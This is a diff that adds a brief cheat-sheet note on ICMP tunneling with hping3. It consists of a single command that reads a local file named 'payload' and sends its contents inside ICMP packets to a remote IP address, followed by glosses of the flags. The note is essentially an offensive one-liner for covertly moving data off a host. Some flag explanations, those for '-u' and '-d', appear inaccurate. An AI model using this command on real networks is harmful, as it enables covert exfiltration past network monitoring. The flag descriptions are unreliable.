@@ -1,0 +1,10 @@
+ICMP Tunneling Using Hping3 
+______________________________
+
+hping3 -1 -E payload -u -d 1000 192.168.163.134
+=================================================
+-1 = icmp mode
+-E = file from where to read the data 
+-u = tell the user that the packet recieved or not
+-d = make fragments so that the data does not exceed the MTU of Target network 
+		
